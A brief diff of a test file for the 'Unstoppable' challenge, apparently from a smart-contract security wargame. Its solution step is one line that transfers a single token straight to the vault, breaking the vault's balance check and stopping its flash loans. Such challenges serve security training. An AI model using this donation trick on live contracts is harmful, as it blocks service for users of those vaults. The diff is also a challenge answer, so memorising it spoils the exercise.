@@ -43,8 +43,9 @@ describe('[Challenge] Unstoppable', function () {
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
-    it('Execution', async function () {
+    it('Execution unstoppable', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).transfer(vault.address, 1);
     });
 
     after(async function () {
